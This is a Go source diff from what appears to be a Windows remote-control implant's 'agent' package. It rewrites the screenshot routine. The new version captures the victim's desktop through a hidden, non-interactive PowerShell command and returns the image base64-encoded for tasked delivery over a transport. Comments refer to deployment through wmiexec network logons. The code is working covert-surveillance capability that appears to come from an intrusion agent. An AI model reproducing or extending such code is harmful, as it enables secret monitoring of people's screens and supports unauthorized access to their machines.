@@ -3,15 +3,11 @@
 package agent
 
 import (
-	"bytes"
 	"context"
 	"encoding/base64"
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
-	"image"
-	"image/color"
-	"image/png"
 	"os"
 	"os/exec"
 	"runtime"
@@ -341,10 +337,14 @@ func listProcessesJSON() (string, error) {
 // ── Screenshot ────────────────────────────────────────────────────────────────
 
 const (
-	SM_CXSCREEN = 0
-	SM_CYSCREEN = 1
-	SRCCOPY     = 0x00CC0020
-	BI_RGB      = 0
+	SM_CXSCREEN       = 0
+	SM_CYSCREEN       = 1
+	SM_XVIRTUALSCREEN = 76
+	SM_YVIRTUALSCREEN = 77
+	SM_CXVIRTUALSCREEN = 78
+	SM_CYVIRTUALSCREEN = 79
+	SRCCOPY            = 0x00CC0020
+	BI_RGB             = 0
 )
 
 type BITMAPINFOHEADER struct {
@@ -362,106 +362,29 @@ type BITMAPINFOHEADER struct {
 }
 
 // captureScreen returns a PNG-encoded screenshot as bytes.
+// Uses PowerShell CopyFromScreen — avoids GDI thread-affinity issues in background sessions.
 func captureScreen() ([]byte, error) {
-	const WINSTA_ALL_ACCESS = 0x037F
-	const DESKTOP_ALL_ACCESS = 0x01FF
-
-	hOrigWinSta, _, _ := procGetProcessWindowStation.Call()
-	hWinSta, _, _ := procOpenWindowStation.Call(
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("WinSta0"))),
-		0, WINSTA_ALL_ACCESS,
-	)
-	if hWinSta != 0 {
-		procSetProcessWindowStation.Call(hWinSta)
+	ps := `Add-Type -AssemblyName System.Drawing,System.Windows.Forms;` +
+		`$s=[System.Windows.Forms.Screen]::PrimaryScreen.Bounds;` +
+		`$bmp=[System.Drawing.Bitmap]::new($s.Width,$s.Height);` +
+		`$gfx=[System.Drawing.Graphics]::FromImage($bmp);` +
+		`$gfx.CopyFromScreen($s.Location,[System.Drawing.Point]::Empty,$s.Size);` +
+		`$ms=[System.IO.MemoryStream]::new();` +
+		`$bmp.Save($ms,[System.Drawing.Imaging.ImageFormat]::Png);` +
+		`[Convert]::ToBase64String($ms.ToArray())`
+	out, err := exec.Command("powershell.exe", "-NoProfile", "-NonInteractive", "-WindowStyle", "Hidden", "-Command", ps).Output()
+	if err != nil {
+		return nil, fmt.Errorf("powershell screenshot: %w", err)
 	}
-
-	tid, _, _ := procGetCurrentThreadId.Call()
-	hOrigDesk, _, _ := procGetThreadDesktop.Call(tid)
-	hDesk, _, _ := procOpenDesktop.Call(
-		uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("Default"))),
-		0, 0, DESKTOP_ALL_ACCESS,
-	)
-	if hDesk != 0 {
-		procSetThreadDesktop.Call(hDesk)
+	b64 := strings.TrimSpace(string(out))
+	data, err := base64.StdEncoding.DecodeString(b64)
+	if err != nil {
+		return nil, fmt.Errorf("base64 decode: %w", err)
 	}
-
-	defer func() {
-		if hDesk != 0 {
-			procSetThreadDesktop.Call(hOrigDesk)
-			procCloseDesktop.Call(hDesk)
-		}
-		if hWinSta != 0 {
-			procSetProcessWindowStation.Call(hOrigWinSta)
-			procCloseWindowStation.Call(hWinSta)
-		}
-	}()
-
-	w, _, _ := procGetSystemMetrics.Call(SM_CXSCREEN)
-	h, _, _ := procGetSystemMetrics.Call(SM_CYSCREEN)
-	width, height := int32(w), int32(h)
-	if width <= 0 || height <= 0 {
-		return nil, fmt.Errorf("invalid screen dimensions: %dx%d", width, height)
+	if len(data) == 0 {
+		return nil, fmt.Errorf("empty capture from PowerShell")
 	}
-
-	hdc, _, _ := procGetDC.Call(0)
-	defer procReleaseDC.Call(0, hdc)
-
-	hdcMem, _, _ := procCreateCompatibleDC.Call(hdc)
-	defer procDeleteDC.Call(hdcMem)
-
-	hbmp, _, _ := procCreateCompatibleBitmap.Call(hdc, uintptr(width), uintptr(height))
-	defer procDeleteObject.Call(hbmp)
-
-	procSelectObject.Call(hdcMem, hbmp)
-	procBitBlt.Call(hdcMem, 0, 0, uintptr(width), uintptr(height), hdc, 0, 0, SRCCOPY)
-
-	bih := BITMAPINFOHEADER{
-		BiSize:        40,
-		BiWidth:       width,
-		BiHeight:      -height,
-		BiPlanes:      1,
-		BiBitCount:    32,
-		BiCompression: BI_RGB,
-	}
-	pixSize := int(width) * int(height) * 4
-	pixels := make([]byte, pixSize)
-	procGetDIBits.Call(
-		hdcMem, hbmp, 0, uintptr(height),
-		uintptr(unsafe.Pointer(&pixels[0])),
-		uintptr(unsafe.Pointer(&bih)),
-		0,
-	)
-
-	// Detect empty capture (all-black pixels) — happens when agent runs in
-	// Session 0 (wmiexec network logon) with no graphical desktop access.
-	nonBlack := false
-	sample := len(pixels)
-	if sample > 65536 {
-		sample = 65536
-	}
-	for i := 0; i < sample; i += 4 {
-		if pixels[i] != 0 || pixels[i+1] != 0 || pixels[i+2] != 0 {
-			nonBlack = true
-			break
-		}
-	}
-	if !nonBlack {
-		return nil, fmt.Errorf("empty capture: agent is in a non-interactive session (Session 0) — no desktop access via WMI/service logon")
-	}
-
-	img := image.NewRGBA(image.Rect(0, 0, int(width), int(height)))
-	for y := 0; y < int(height); y++ {
-		for x := 0; x < int(width); x++ {
-			i := (y*int(width) + x) * 4
-			img.SetRGBA(x, y, color.RGBA{R: pixels[i+2], G: pixels[i+1], B: pixels[i], A: 255})
-		}
-	}
-
-	var buf bytes.Buffer
-	if err := png.Encode(&buf, img); err != nil {
-		return nil, fmt.Errorf("png encode: %w", err)
-	}
-	return buf.Bytes(), nil
+	return data, nil
 }
 
 func takeScreenshot(t transport, taskID int64) (string, error) {
